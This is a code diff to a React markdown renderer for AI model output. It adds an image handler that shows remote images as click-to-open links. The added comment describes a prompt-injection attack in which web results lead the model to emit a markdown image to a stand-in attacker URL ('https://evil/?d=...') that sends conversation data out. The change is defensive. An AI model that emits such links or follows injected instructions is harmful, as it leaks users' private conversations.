@@ -92,6 +92,28 @@ export function AssistantMarkdown({
               {children}
             </a>
           ),
+          // Never auto-load remote images from model output. Web results are
+          // attacker-influenceable, and a prompt-injected `![x](https://evil/?d=...)`
+          // would otherwise make the browser exfiltrate conversation data (or
+          // leak viewer IPs on shared chats) the moment the answer renders.
+          // Render the image as a plain link the user has to choose to open.
+          img: ({ src, alt }) => {
+            const href = typeof src === "string" ? src : "";
+            const label = alt?.trim() || "image";
+            if (!/^https?:\/\//i.test(href)) {
+              return <span className="text-muted-foreground">[{label}]</span>;
+            }
+            return (
+              <a
+                href={href}
+                className="text-foreground underline underline-offset-2 hover:opacity-70"
+                target="_blank"
+                rel="noopener noreferrer nofollow"
+              >
+                [image: {label}]
+              </a>
+            );
+          },
         }}
       >
         {normalizeAssistantMarkdown(stripToolCallMarkup(content))}
